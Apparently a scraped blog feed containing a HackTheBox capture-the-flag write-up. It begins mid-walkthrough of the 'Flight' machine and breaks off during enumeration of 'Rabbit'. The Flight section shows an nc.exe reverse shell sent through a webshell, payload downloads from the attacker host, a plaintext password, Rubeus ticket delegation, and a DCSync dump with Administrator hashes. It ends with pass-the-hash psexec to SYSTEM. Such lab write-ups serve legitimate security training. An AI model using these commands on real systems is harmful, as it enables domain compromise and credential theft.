Let\u0026rsquo;s get reverse shell └─$ curl \u0026#39;http://school.flight.htb/styles/shell.php?cmd=nc.exe+10.10.16.9+6666+-e+cmd\u0026#39; User #4 We have port 8000 that we didn\u0026rsquo;t get from nmap C:\\\u0026gt;netstat -ano netstat -ano Active Connections Proto Local Address Foreign Address State PID TCP 0.0.0.0:80 0.0.0.0:0 LISTENING 1844 TCP 0.0.0.0:88 0.0.0.0:0 LISTENING 640 TCP 0.0.0.0:135 0.0.0.0:0 LISTENING 920 TCP 0.0.0.0:389 0.0.0.0:0 LISTENING 640 TCP 0.0.0.0:443 0.0.0.0:0 LISTENING 1844 TCP 0.0.0.0:445 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:464 0.0.0.0:0 LISTENING 640 TCP 0.0.0.0:593 0.0.0.0:0 LISTENING 920 TCP 0.0.0.0:636 0.0.0.0:0 LISTENING 640 TCP 0.0.0.0:3268 0.0.0.0:0 LISTENING 640 TCP 0.0.0.0:3269 0.0.0.0:0 LISTENING 640 TCP 0.0.0.0:5985 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:8000 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:9389 0.0.0.0:0 LISTENING 2796 TCP 0.0.0.0:47001 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:49664 0.0.0.0:0 LISTENING 492 TCP 0.0.0.0:49665 0.0.0.0:0 LISTENING 1160 TCP 0.0.0.0:49666 0.0.0.0:0 LISTENING 1524 TCP 0.0.0.0:49667 0.0.0.0:0 LISTENING 640 TCP 0.0.0.0:49673 0.0.0.0:0 LISTENING 640 TCP 0.0.0.0:49674 0.0.0.0:0 LISTENING 640 TCP 0.0.0.0:49682 0.0.0.0:0 LISTENING 632 TCP 0.0.0.0:49694 0.0.0.0:0 LISTENING 2944 TCP 0.0.0.0:49721 0.0.0.0:0 LISTENING 2888 inetpub C:\\inetpub\u0026gt;dir dir Volume in drive C has no label. Volume Serial Number is 1DF4-493D Directory of C:\\inetpub 09/23/2023 06:17 PM \u0026lt;DIR\u0026gt; . 09/23/2023 06:17 PM \u0026lt;DIR\u0026gt; .. 09/22/2022 12:24 PM \u0026lt;DIR\u0026gt; custerr 09/23/2023 06:17 PM \u0026lt;DIR\u0026gt; development 09/22/2022 01:08 PM \u0026lt;DIR\u0026gt; history 09/22/2022 12:32 PM \u0026lt;DIR\u0026gt; logs 09/22/2022 12:24 PM \u0026lt;DIR\u0026gt; temp 09/22/2022 12:28 PM \u0026lt;DIR\u0026gt; wwwroot 0 File(s) 0 bytes 8 Dir(s) 5,131,374,592 bytes free The development folder looks interesting Probably hosted on port 8000 icalcs shows that C.Bum can write to it C:\\inetpub\u0026gt;icacls development icacls development development flight\\C.Bum:(OI)(CI)(W) NT SERVICE\\TrustedInstaller:(I)(F) NT SERVICE\\TrustedInstaller:(I)(OI)(CI)(IO)(F) NT AUTHORITY\\SYSTEM:(I)(F) NT AUTHORITY\\SYSTEM:(I)(OI)(CI)(IO)(F) BUILTIN\\Administrators:(I)(F) BUILTIN\\Administrators:(I)(OI)(CI)(IO)(F) BUILTIN\\Users:(I)(RX) BUILTIN\\Users:(I)(OI)(CI)(IO)(GR,GE) CREATOR OWNER:(I)(OI)(CI)(IO)(F) C.Bum is a user of WebDevs We can\u0026rsquo;t do RunAs since he\u0026rsquo;s not a member of Remote Users C:\\\u0026gt;net user c.bum net user c.bum User name C.Bum Full Name Comment Senior Web Developer User\u0026#39;s comment Country/region code 000 (System Default) Account active Yes Account expires Never Password last set 9/22/2022 1:08:22 PM Password expires Never Password changeable 9/23/2022 1:08:22 PM Password required Yes User may change password Yes Workstations allowed All Logon script User profile Home directory Last logon 9/23/2023 5:49:48 PM Logon hours allowed All Local Group Memberships Global Group memberships *Domain Users *WebDevs The command completed successfully. We can use RunasCs c:\\ProgramData\u0026gt;powershell -c wget \u0026#39;http://10.10.16.9/RunasCs/RunasCs.exe\u0026#39; -outfile r.exe powershell -c wget \u0026#39;http://10.10.16.9/RunasCs/RunasCs.exe\u0026#39; -outfile r.exe c:\\ProgramData\u0026gt;.\\r.exe C.Bum Tikkycoll_431012284 -r 10.10.16.9:7777 cmd .\\r.exe C.Bum Tikkycoll_431012284 -r 10.10.16.9:7777 cmd [*] Warning: The logon for user \u0026#39;C.Bum\u0026#39; is limited. Use the flag combination --bypass-uac and --logon-type \u0026#39;8\u0026#39; to obtain a more privileged token. [+] Running in session 0 with process function CreateProcessWithLogonW() [+] Using Station\\Desktop: Service-0x0-5c489$\\Default [+] Async process \u0026#39;C:\\Windows\\system32\\cmd.exe\u0026#39; with pid 2916 created in background. I\u0026rsquo;ll upload chisel and cofigure port forwarding c:\\ProgramData\u0026gt;powershell -c wget \u0026#39;http://10.10.16.9/chisel/chisel.exe\u0026#39; -outfile chisel.exe powershell -c wget \u0026#39;http://10.10.16.9/chisel/chisel.exe\u0026#39; -outfile chisel.exe └─$ chisel server -p 9001 --reverse 2023/09/23 20:03:29 server: Reverse tunnelling enabled 2023/09/23 20:03:29 server: Fingerprint JeRr1Iv0QFNX3h/ccCpD0kkPmmodD/6H8mfxn9glwA0= 2023/09/23 20:03:29 server: Listening on http://0.0.0.0:9001 c:\\ProgramData\u0026gt;.\\chisel client 10.10.16.9:9001 R:8000:127.0.0.1:8000 .\\chisel client 10.10.16.9:9001 R:8000:127.0.0.1:8000 Now we have access to port 8000 from our attack box Nothing interesting on website But it\u0026rsquo;s development folder we saw in inetpub We can try uploading webshell as C.Bum The page says it\u0026rsquo;s X-Powered-By: ASP.NET, means that .aspx file type is in use. C:\\inetpub\\development\u0026gt;powershell -c wget \u0026#39;http://10.10.16.9/webshell/fuzzdb-webshell/asp/cmd.aspx\u0026#39; -outfile cmd.aspx powershell -c wget \u0026#39;http://10.10.16.9/webshell/fuzzdb-webshell/asp/cmd.aspx\u0026#39; -outfile cmd.aspx Let\u0026rsquo;s get reverse shell Root whoami c:\\windows\\system32\\inetsrv\u0026gt;whoami whoami iis apppool\\defaultapppool c:\\windows\\system32\\inetsrv\u0026gt;whoami /priv whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ========================================= ======== SeAssignPrimaryTokenPrivilege Replace a process level token Disabled SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled SeMachineAccountPrivilege Add workstations to domain Disabled SeAuditPrivilege Generate security audits Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled c:\\windows\\system32\\inetsrv\u0026gt;whoami /groups whoami /groups GROUP INFORMATION ----------------- Group Name Type SID Attributes ========================================== ================ ============ ================================================== Mandatory Label\\High Mandatory Level Label S-1-16-12288 Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\SERVICE Well-known group S-1-5-6 Mandatory group, Enabled by default, Enabled group CONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group BUILTIN\\IIS_IUSRS Alias S-1-5-32-568 Mandatory group, Enabled by default, Enabled group LOCAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled group Unknown SID type S-1-5-82-0 Mandatory group, Enabled by default, Enabled group We can try Potato attack Or get a ticket and perform DCsync since defaultapppool is a system account https://www.thehacker.recipes/a-d/movement/kerberos/delegations/s4u2self-abuse#microsoft-virtual-accounts We will download a Rubeus Let\u0026rsquo;s retrieve a usable TGT .kirbi for the current user c:\\ProgramData\u0026gt;.\\rubeus.exe tgtdeleg /nowrap .\\rubeus.exe tgtdeleg /nowrap ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.2.0 [*] Action: Request Fake Delegation TGT (current user) [*] No target SPN specified, attempting to build \u0026#39;cifs/dc.domain.com\u0026#39; [*] Initializing Kerberos GSS-API w/ fake delegation for target \u0026#39;cifs/g0.flight.htb\u0026#39; [+] Kerberos GSS-API initialization success! [+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output. [*] Found the AP-REQ delegation ticket in the GSS-API output. [*] Authenticator etype: aes256_cts_hmac_sha1 [*] Extracted the service ticket session key from the ticket cache: ZC94EHDx7bl7K48HFw67lS4bobToY9KsEJVjbR05ePw= [+] Successfully decrypted the authenticator [*] base64(ticket.kirbi): doIFVDCCBVCgAwIBBaEDAgEWooIEZDCCBGBhggRcMIIEWKADAgEFoQwbCkZMSUdIVC5IVEKiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCkZMSUdIVC5IVEKjggQgMIIEHKADAgESoQMCAQKiggQOBIIEClRHKont/zFCGa6MJYudTEwHjrtQeQRAZBPdDy/mYiwMFSEAYMM8i1sz3nz3QkARVAc4dFG1nDFsSO4nt5oHEu7G3emeOSTcO5jANRV3ghYMAInoIX05g67Yh8cQwNJgKdRCJGeg3Sn6JPoRR/V9SadzhqN2P5Vp15o2dLozD/QNBzEsGepZ0Bk9Wwk60TgVd6l/w+kY5KFbIuEVFwHFeVPi7l6wm6g8YMDCpLTdft2nHo91oA2PXyE4mN/RRottrQYQ6gnW7Ljo1Gxw4KCkUG3oDUpTRNtuz5kr4BN1Hz+iQhpqoeUsL7QA34IojA5IaN6IOaex8VJKp2romFinc3kp9xchvMFF5ny/w2XDW7JCEuI0ERvbe/Y0XB/2v6WaH8oSMulOg9XyDAU5hr6ct6hb/tMNAEB5uoqcf69XZOc6qW/RcIaPqYRE0BNCTmgnRhu0hlFx5a0+g0orkStvJWa/nHBk5SlCPHTR2jxcYRCzLOlTcMJPxPWYG239IfEOIGnzLSfpXaym20cM0JNqPCbeH0HdDa8EozD9AUX3UTuWa+O9HcMVtHn/VvH3g2yAmQo5hqln6NT0gNT5qlh6Pgl6LtsI1+p1JLr4cnob3NGomT/zkHbM/S8lbIxIP2H77fWevbD+3kSg6+1yYBxEEaUmaljjtdFcNBn3EAWoW2nRAK3rtZZzJ2FRBweUeEJMSt5LXFAv6cic4VRv9Wrm+KFnf3c5I/pF/889zF8ddXYj4Tfsxs6bH1x6LFzB9/h/2rRqZyjAwNj+0hLTDvPsQ41D+4S/0Jgs98/N4VPXjvhYBZuQg3TnHNGzbHjq2hFiUtHFznTfbXb/jEX7ii2isWPlBApLULVxGMHK0oZfD/qBX6oy+FVEvhYdtJAHhJRxQFuFLh8tfano9APWhonMwUji9Xntbmu+8b/oEI6FI21EL7BS1PPxUG/3gL6nkULQU21nPLZAD8UyA5JXXNe82tgW7ppFxXHw/HdLUA+s02SC53v2Mqs58wtrZnANSc3lCsuyZeEpGSCJEGcYezvzKnJniLldJYw8fCACDPJjvZdHqcTlmpSQDUgVxXdIzmquZcerwf9TMmImDkaNUtEYYWmwzvUBUPxABtpomfT/bQl3/fGZveuhZ/HSsn6uRDTRrtQekcK8m6T6nuJEa8MltoL/1fXFQwz2dbtJa4iMn94EsRsPbUu+zSqeJXUKL92034T4Cu1XWymvR7UXiQtwguIYzytvuOmGw2c8LvYUQ9XUXVJFCzHTu/7XG2WooOhq8xunrr5jvRwqsF5WLLg+otMPnQ8UV/DBN0R5zyfwK9acLONjelFV0v3YogvLGALvUY9nB8WXPOihqIVmteEgZMWKzCNT2wcbt9Pyo4HbMIHYoAMCAQCigdAEgc19gcowgceggcQwgcEwgb6gKzApoAMCARKhIgQgCbNvRWiV0kOC6VPOkl1kQlmez+E3wdp0aORuxnSKYTOhDBsKRkxJR0hULkhUQqIQMA6gAwIBAaEHMAUbA0cwJKMHAwUAYKEAAKURGA8yMDIzMDkyNDAyMzgxM1qmERgPMjAyMzA5MjQxMjM4MTNapxEYDzIwMjMxMDAxMDIzODEzWqgMGwpGTElHSFQuSFRCqR8wHaADAgECoRYwFBsGa3JidGd0GwpGTElHSFQuSFRC Save the ticket as \u0026lt;name\u0026gt;.kirbi and use minikerberos-kirbi2ccache └─$ minikerberos-kirbi2ccache ticket.kirbi ticket.ccache INFO:root:Parsing kirbi file /home/kali/Documents/tasks/ticket.kirbi INFO:root:Done! └─$ KRB5CCNAME=./ticket.ccache impacket-secretsdump -k -no-pass g0.flight.htb Impacket v0.11.0 - Copyright 2023 Fortra [-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user [*] Cleaning up... Let\u0026rsquo;s try with -just-dc-user Administrator └─$ KRB5CCNAME=./ticket.ccache impacket-secretsdump -k -no-pass g0.flight.htb -just-dc-user Administrator Impacket v0.11.0 - Copyright 2023 Fortra [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets [-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great) [*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter [*] Cleaning up... We have to sync our box with the Domain Controller └─$ sudo ntpdate -s flight.htb; KRB5CCNAME=./ticket.ccache impacket-secretsdump -k -no-pass g0.flight.htb -just-dc-user Administrator Impacket v0.11.0 - Copyright 2023 Fortra [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c::: [*] Kerberos keys grabbed Administrator:aes256-cts-hmac-sha1-96:08c3eb806e4a83cdc660a54970bf3f3043256638aea2b62c317feffb75d89322 Administrator:aes128-cts-hmac-sha1-96:735ebdcaa24aad6bf0dc154fcdcb9465 Administrator:des-cbc-md5:c7754cb5498c2a2f [*] Cleaning up... Let\u0026rsquo;s psexec and get our flag └─$ impacket-psexec Administrator@flight.htb -hashes \u0026#39;:43bbfc530bab76141b12c8446e30c17c\u0026#39; Impacket v0.11.0 - Copyright 2023 Fortra [*] Requesting shares on flight.htb..... [*] Found writable share ADMIN$ [*] Uploading file hMiZkYDv.exe [*] Opening SVCManager on flight.htb..... [*] Creating service ZhUZ on flight.htb..... [*] Starting service ZhUZ..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.17763.2989] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt; whoami nt authority\\system C:\\Windows\\system32\u0026gt; ","date":"September 20, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/flight/images/flight.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/flight/","summary":"Flight Enumeration nmap └─$ nmap -Pn -p- 10.10.11.187 -T4 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-20 19:23 BST Nmap scan report for 10.10.11.187 (10.10.11.187) Host is up (0.099s latency). Not shown: 65517 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws 49668/tcp open unknown 49675/tcp open unknown 49676/tcp open unknown 49696/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 43.","tags":["HTB","vhosts","crackmapexec","php","apache","file-read","directory-traversal","responder","net-ntlmv2","password-spray","lookupsid","rpc","ntlm-theft","runascs","iis","webshell","aspx","rubeus","machine-account","dcsync","secretsdump","psexec"],"title":"[HTB] Machine: Flight"},{"categories":null,"contents":"Rabbit Enumeration nmap └─$ nmap -Pn -p- 10.10.10.71 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-24 18:48 BST Warning: 10.10.10.71 giving up on port because retransmission cap hit (6). Nmap scan report for 10.10.10.71 (10.10.10.71) Host is up (0.16s latency). Not shown: 65482 closed tcp ports (conn-refused) PORT STATE SERVICE 25/tcp open smtp 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 389/tcp open ldap 443/tcp open https 445/tcp open microsoft-ds 464/tcp open kpasswd5 587/tcp open submission 593/tcp open http-rpc-epmap 636/tcp open ldapssl 808/tcp open ccproxy-http 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 3306/tcp open mysql 5722/tcp open msdfsr 5985/tcp open wsman 6001/tcp open X11:1 6002/tcp open X11:2 6003/tcp open X11:3 6004/tcp open X11:4 6005/tcp open X11:5 6006/tcp open X11:6 6007/tcp open X11:7 6008/tcp open X11:8 6010/tcp open x11 6011/tcp open x11 6019/tcp open x11 6143/tcp open watershed-lm 8080/tcp open http-proxy 9389/tcp open adws 9706/tcp open unknown 9712/tcp open unknown 9716/tcp open unknown 9733/tcp open unknown 9736/tcp open unknown 9744/tcp open unknown 9768/tcp open unknown 9784/tcp open unknown 9795/tcp open unknown 9799/tcp open unknown 9805/tcp open unknown 9808/tcp open unknown 9825/tcp open unknown 9837/tcp open unknown 9850/tcp open unknown 9861/tcp open unknown 25562/tcp filtered unknown 47001/tcp open winrm 48104/tcp filtered unknown 64327/tcp open unknown 64337/tcp open unknown └─$ nmap -Pn -p25,53,80,88,135,389,443,445,464,587,593,636,808,3268,3269,3306,5722,5985,6001,6002,6003,6004,6005,6006,6007,6008,6010,6011,6019,6143,8080,9389,9706,9712,9716,9733,9736,9744,9768,9784,9795,9799,9805,9808,9825,9837,9850,9861,25562,47001,48104,64327,64337 -sC -sV 10.10.10.71 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-24 19:08 BST Nmap scan report for 10.10.10.71 (10.10.10.71) Host is up (0.18s latency). PORT STATE SERVICE VERSION 25/tcp open smtp Microsoft Exchange smtpd | smtp-commands: Rabbit.htb.local Hello [10.10.16.9], SIZE, PIPELINING, DSN, ENHANCEDSTATUSCODES, X-ANONYMOUSTLS, AUTH NTLM, X-EXPS GSSAPI NTLM, 8BITMIME, BINARYMIME, CHUNKING, XEXCH50, XRDST, XSHADOW |_ This server supports the following commands: HELO EHLO STARTTLS RCPT DATA RSET MAIL QUIT HELP AUTH BDAT | smtp-ntlm-info: | Target_Name: HTB | NetBIOS_Domain_Name: HTB | NetBIOS_Computer_Name: RABBIT | DNS_Domain_Name: htb.local | DNS_Computer_Name: Rabbit.htb.local | DNS_Tree_Name: htb.local |_ Product_Version: 6.1.7601 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 80/tcp open http Microsoft IIS httpd 7.5 |_http-server-header: Microsoft-IIS/7.5 |_http-title: 403 - Forbidden: Access is denied. 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-09-24 23:08:23Z) 135/tcp open msrpc Microsoft Windows RPC 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 443/tcp open ssl/http Microsoft IIS httpd 7.5 | http-methods: |_ Potentially risky methods: TRACE | sslv2: | SSLv2 supported | ciphers: | SSL2_RC4_128_WITH_MD5 |_ SSL2_DES_192_EDE3_CBC_WITH_MD5 |_http-server-header: Microsoft-IIS/7.5 |_ssl-date: 2023-09-24T23:09:56+00:00; +4h59m20s from scanner time. | ssl-cert: Subject: commonName=Rabbit | Subject Alternative Name: DNS:Rabbit, DNS:Rabbit.htb.local | Not valid before: 2017-10-24T17:56:42 |_Not valid after: 2022-10-24T17:56:42 |_http-title: IIS7 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 587/tcp open smtp Microsoft Exchange smtpd | smtp-ntlm-info: | Target_Name: HTB | NetBIOS_Domain_Name: HTB | NetBIOS_Computer_Name: RABBIT | DNS_Domain_Name: htb.local | DNS_Computer_Name: Rabbit.htb.local | DNS_Tree_Name: htb.local |_ Product_Version: 6.1.7601 | smtp-commands: Rabbit.htb.local Hello [10.10.16.9], SIZE 10485760, PIPELINING, DSN, ENHANCEDSTATUSCODES, AUTH GSSAPI NTLM, 8BITMIME, BINARYMIME, CHUNKING |_ This server supports the following commands: HELO EHLO STARTTLS RCPT DATA RSET MAIL QUIT HELP AUTH BDAT 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ldapssl? 808/tcp open ccproxy-http? 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open globalcatLDAPssl? 3306/tcp open mysql MySQL 5.7.19 | mysql-info: | Protocol: 10 | Version: 5.7.19 | Thread ID: 15 | Capabilities flags: 63487 | Some Capabilities: DontAllowDatabaseTableColumn, Support41Auth, SupportsTransactions, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, Speaks41ProtocolOld, InteractiveClient, ODBCClient, IgnoreSigpipes, LongColumnFlag, LongPassword, Speaks41ProtocolNew, SupportsLoadDataLocal, FoundRows, SupportsCompression, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins | Status: Autocommit | Salt: ?s( 8h) | \\x0FHpes~\\x1D-\\x1E \\x11H |_ Auth Plugin Name: mysql_native_password 5722/tcp open msrpc Microsoft Windows RPC 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 6001/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 6002/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 6003/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 6004/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 6005/tcp open msrpc Microsoft Windows RPC 6006/tcp open msrpc Microsoft Windows RPC 6007/tcp open msrpc Microsoft Windows RPC 6008/tcp open msrpc Microsoft Windows RPC 6010/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 6011/tcp open msrpc Microsoft Windows RPC 6019/tcp open msrpc Microsoft Windows RPC 6143/tcp open msrpc Microsoft Windows RPC 8080/tcp open http Apache httpd 2.4.27 ((Win64) PHP/5.6.31) |_http-server-header: Apache/2.4.27 (Win64) PHP/5.6.31 |_http-title: Example | http-methods: |_ Potentially risky methods: TRACE |_http-open-proxy: Proxy might be redirecting requests 9389/tcp open mc-nmf .NET Message Framing 9706/tcp open msrpc Microsoft Windows RPC 9712/tcp open msrpc Microsoft Windows RPC 9716/tcp open msrpc Microsoft Windows RPC 9733/tcp open msrpc Microsoft Windows RPC 9736/tcp open msrpc Microsoft Windows RPC 9744/tcp open msrpc Microsoft Windows RPC 9768/tcp open msrpc Microsoft Windows RPC 9784/tcp open msrpc Microsoft Windows RPC 9795/tcp open msrpc Microsoft Windows RPC 9799/tcp open msrpc Microsoft Windows RPC 9805/tcp open msrpc Microsoft Windows RPC 9808/tcp open msrpc Microsoft Windows RPC 9825/tcp open msrpc Microsoft Windows RPC 9837/tcp open msrpc Microsoft Windows RPC 9850/tcp open msrpc Microsoft Windows RPC 9861/tcp open msrpc Microsoft Windows RPC 25562/tcp closed unknown 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 48104/tcp closed unknown 64327/tcp open msexchange-logcopier Microsoft Exchange 2010 log copier 64337/tcp open mc-nmf .NET Message Framing Service Info: Hosts: Rabbit.htb.local, RABBIT; OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2:sp1 Host script results: |_smb2-time: Protocol negotiation failed (SMB2) |_clock-skew: mean: 4h59m19s, deviation: 0s, median: 4h59m19s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 115.60 seconds dns └─$ dig @10.10.10.71 htb.local ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.18.16-1-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; @10.10.10.71 htb.local ; (1 server found) ;; global options: +cmd ;; Got answer: ;; WARNING: .local is reserved for Multicast DNS ;; You are currently testing what happens when an mDNS query is leaked to DNS ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: FORMERR, id: 52872 ;; flags: qr rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1 ;; WARNING: recursion requested but not available ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 1232 ; COOKIE: e422a86ce556fab3 (echoed) ;; QUESTION SECTION: ;htb.local. IN A ;; Query time: 99 msec ;; SERVER: 10.10.10.71#53(10.10.10.71) (UDP) ;; WHEN: Sun Sep 24 20:55:55 BST 2023 ;; MSG SIZE rcvd: 50 └─$ dig axfr @10.10.10.71 htb.local ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.18.16-1-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; axfr @10.10.10.71 htb.local ; (1 server found) ;; global options: +cmd ; Transfer failed. smb └─$ smbclient -N -L //10.10.10.71 protocol negotiation failed: NT_STATUS_CONNECTION_RESET rpcclient └─$ rpcclient 10.10.10.71 Cannot connect to server. Error was NT_STATUS_CONNECTION_RESET Web Server Port 443 Port 8080 gobuster └─$ feroxbuster -u https://10.10.10.71 -x asp,aspx -k -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --depth 1 ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.10.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ https://10.10.10.71 🚀 Threads │ 50 📖 Wordlist │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 👌 Status Codes │ All Status Codes! 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.10.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔎 Extract Links │ true 💲 Extensions │ [asp, aspx] 🏁 HTTP methods │ [GET] 🔓 Insecure │ true 🔃 Recursion Depth │ 1 ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── 404 GET 29l 95w 1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter 404 GET 32l 121w -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter 200 GET 826l 4457w 331772c https://10.10.10.71/welcome.png 200 GET 32l 53w 689c https://10.10.10.71/ 302 GET 2l 10w 146c https://10.10.10.71/public =\u0026gt; https://10.10.10.71/owa 302 GET 2l 10w 146c https://10.10.10.71/exchange =\u0026gt; https://10.10.10.71/owa 302 GET 2l 10w 146c https://10.10.10.71/Public =\u0026gt; https://10.10.10.71/owa 404 GET 32l 122w 1501c https://10.10.10.71/%20.aspx 400 GET 1l 2w 11c https://10.10.10.71/*checkout*.aspx 301 GET 0l 0w 0c https://10.10.10.71/owa =\u0026gt; https://10.10.10.71/owa/ 400 GET 1l 2w 11c https://10.10.10.71/*docroot*.aspx 400 GET 1l 2w 11c https://10.10.10.71/*.aspx 404 GET 32l 122w 1511c https://10.10.10.71/video%20games.aspx 404 GET 32l 122w 1514c https://10.10.10.71/spyware%20doctor.aspx 404 GET 32l 124w 1514c https://10.10.10.71/4%20Color%2099%20IT2.aspx 404 GET 32l 122w 1508c https://10.10.10.71/cable%20tv.aspx 404 GET 32l 122w 1513c https://10.10.10.71/long%20distance.aspx 400 GET 1l 2w 11c https://10.10.10.71/http%3A%2F%2Fwww.aspx 404 GET 32l 122w 1510c https://10.10.10.71/windows%20xp.aspx 404 GET 32l 124w 1526c https://10.10.10.71/Michael%20Jackson%20-%20Thriller.aspx 404 GET 32l 122w 1516c https://10.10.10.71/Battlefield%202142.aspx 404 GET 32l 122w 1512c https://10.10.10.71/System%20Tools.aspx └─$ feroxbuster -u http://10.10.10.71:8080 -x php -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --depth 1 ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.10.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.10.10.71:8080 🚀 Threads │ 50 📖 Wordlist │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 👌 Status Codes │ All Status Codes! 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.10.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔎 Extract Links │ true 💲 Extensions │ [php] 🏁 HTTP methods │ [GET] 🔃 Recursion Depth │ 1 ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── 403 GET 11l 33w -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter 404 GET 9l 33w -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter 200 GET 107l 178w 10065c http://10.10.10.71:8080/index 200 GET 107l 178w 10065c http://10.10.10.71:8080/ 200 GET 107l 178w 10065c http://10.10.10.71:8080/Index 200 GET 345l 1784w 453156c http://10.10.10.71:8080/favicon 200 GET 107l 178w 10065c http://10.10.10.71:8080/INDEX 301 GET 9l 29w 328c http://10.10.10.71:8080/joomla =\u0026gt; 